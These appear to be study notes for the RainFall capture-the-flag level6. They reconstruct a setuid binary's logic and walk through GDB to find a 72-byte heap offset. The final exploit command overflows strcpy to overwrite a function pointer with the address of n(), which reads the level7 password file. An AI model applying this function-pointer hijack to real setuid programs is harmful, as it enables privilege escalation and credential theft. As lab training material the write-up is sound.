# Level6 - Exam Notes

## 1. Objective
Display the level7 password. The binary is setuid level7; `n()` runs `system("/bin/cat /home/user/level7/.pass")` but is not called. By default a function pointer points to `m()` ("Nope").

## 2. Copy the binary (extraction)
From the host:
```bash
scp -P 4242 level6@localhost:level6 ./level6.bin
```

## 3. Binary-to-source translation (source reconstruction)
- **Objdump -d main:** main does two `malloc`: first 0x40 (64 bytes) for a buffer, second 4 bytes for a pointer. The pointer is initialised with the address of **m**. Then **strcpy(buffer, argv[1])** with no limit, then **call *ptr** (pointer indirection).
- **Where it can break:** strcpy copies argv[1] with no bound. The 4-byte block (pointer) is after the buffer on the heap. By exceeding 64 bytes (plus possible chunk header), we overwrite this pointer. If we put the address of **n** there, call *ptr will run n() → password is printed.
- Source: see `source`.

## 4. Understanding where it can break (vulnerability hypothesis)
- **Suspicious functions:** strcpy(buffer, argv[1]) with no limit; 64-byte buffer.
- **Success:** have call *ptr invoke n() instead of m(). So overwrite the pointer with the address of n (0x08048454).
- **Hypothesis:** heap buffer overflow; exact offset depends on layout (64 + header). On Rainfall: **72** bytes before the 4 bytes of the pointer.

## 5. GDB diagnosis step-by-step

1. **Start GDB**
   ```bash
   gdb -q ./level6.bin
   ```

2. **Locate main and the indirect call**
   ```gdb
   disas main
   ```
   Note: malloc(0x40), malloc(4), strcpy, then the instruction that loads the pointer and does **call** (e.g. call *%eax). Set a breakpoint just before that call.

3. **Breakpoint before call *ptr**
   ```gdb
   break *0x080484d0
   run $(python -c 'print "A"*72 + "BBBB"')
   ```
   Goal: see the register value (e.g. eax) that will be used for the call. If overflow is correct, with 72 + "BBBB" we want to see if we already control it (e.g. 0x42424242).

4. **Measure the offset**
   Try 64, 68, 72. With 72 + "\x54\x84\x04\x08" (address of n in LE), at the breakpoint:
   ```gdb
   p/x $eax
   ```
   Must show 0x08048454. If so, offset **72** confirmed.

5. **Addresses**
   ```gdb
   info functions n
   info functions m
   ```
   **n = 0x08048454**, m = 0x08048468. For the exploit we only need the address of n in little-endian.

6. **Verification**
   `run $(python -c 'print "A"*72 + "\x54\x84\x04\x08"')`. After the call, the program should run n() and print the password. This proves function pointer hijack.

## 6. Exploit design and command explanation

**Command generation (converter.py):**
`level6/Ressources/converter.py` takes the offset (72 on RainFall) and the address of **n** (0x08048454) and prints the final command. Inputs: values found in GDB (section 5).

**Design:** Heap overflow via strcpy; the target is not the stack but the **function pointer** stored right after the buffer. By overwriting it with the address of n(), the `call *ptr` instruction invokes n() → system("/bin/cat .../.pass").

**Final command (see `commands.md`, Exploitation):**
```bash
./level6 $(python -c 'print "A"*72 + "\x54\x84\x04\x08"')
```

**Breakdown:**

- **Invocation:** the program only reads argv[1]; no need to keep stdin open. We pass the payload as argument.

- **Part 1 — 72 bytes 'A' (padding)**
  - Fill the 64-byte buffer and overflow up to the pointer (offset 72 found in GDB: 64 + 8 bytes header/alignment on Rainfall).
  - These bytes overwrite everything up to (but not including) the 4 bytes of the pointer.

- **Part 2 — 4 bytes: address of n (new pointer value)**
  - Address: **0x08048454**.
  - Little-endian: low byte first → 54, 84, 04, 08.
  - In Python: `\x54\x84\x04\x08`.
  - Role: these 4 bytes overwrite the function pointer. At `call *ptr`, the CPU reads 0x08048454 and jumps to n().

Summary: **72 × 'A'** = offset to the pointer; **\x54\x84\x04\x08** = address of n in LE → the pointer points to n(), password is printed.


